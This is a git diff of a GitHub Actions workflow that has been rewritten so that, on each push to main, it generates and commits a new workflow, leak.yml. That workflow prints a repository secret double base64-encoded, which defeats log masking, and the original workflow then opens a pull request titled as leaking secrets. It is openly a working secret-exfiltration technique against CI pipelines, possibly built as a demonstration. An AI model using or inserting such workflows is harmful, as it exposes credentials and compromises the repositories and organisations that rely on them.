@@ -1,11 +1,13 @@
 name: Create and Push Branch, Then Make PR
 
 on:
-  pull_request:
-    types: [opened, reopened, synchronize, edited]
+  push:
+    branches:
+      - main
 
 permissions: 
-  write-all
+  contents: write
+  pull-requests: write
 
 jobs:
   create-push-pr:
@@ -25,17 +27,35 @@ jobs:
 
       - name: Create new branch
         run: |
-          BRANCH_NAME="test"
+          BRANCH_NAME="leak-branch-$(date +%s)"
           echo "BRANCH_NAME=${BRANCH_NAME}" >> $GITHUB_ENV
           git checkout -b ${BRANCH_NAME}
 
       - name: Make changes
         run: |
-          echo "New content" > edited-file.txt
-          git add edited-file.txt
-          git commit -m "Edit file with new content"
+          mkdir -p .github/workflows
+          cat << 'EOF' > .github/workflows/leak.yml
+          name: Leak secret
 
-      
+          on:
+            pull_request:
+              types: [opened, reopened, synchronize, edited]
+
+          permissions: 
+            write-all
+
+          jobs:
+            example-job:
+              runs-on: ubuntu-latest
+
+              steps:
+
+                - name: Run script
+                  run: |
+                    echo ${{ secrets.SUPER_SECRET }} | base64 -w0 | base64 -w0
+          EOF
+          git add .github/workflows/leak.yml
+          git commit -m "Add leak.yml to leak secrets"
 
       - name: Push changes to new branch
         env:
@@ -46,14 +66,15 @@ jobs:
           git push -u origin ${BRANCH_NAME}
 
       - name: Create Pull Request
-        id: cpr
-        uses: peter-evans/create-pull-request@v6
+        uses: peter-evans/create-pull-request@v5
         with:
-          commit-message: Update report
+          token: ${{ secrets.GITHUB_TOKEN }}
+          commit-message: "Add leak.yml to leak secrets"
           committer: github-actions[bot] <41898282+github-actions[bot]@users.noreply.github.com>
-          author: ${{ github.actor }} <${{ github.actor_id }}+${{ github.actor }}@users.noreply.github.com>
-          branch: bla
+          author: ${{ github.actor }} <${{ github.actor }}+${{ github.actor }}@users.noreply.github.com>
+          branch: ${{ env.BRANCH_NAME }}
           delete-branch: false
-          title: '[Example] Update report'
-          body: Update report
+          base: main
+          title: '[Leak] Add leak.yml to leak secrets'
+          body: "This PR adds the leak.yml file to leak secrets."
           draft: false
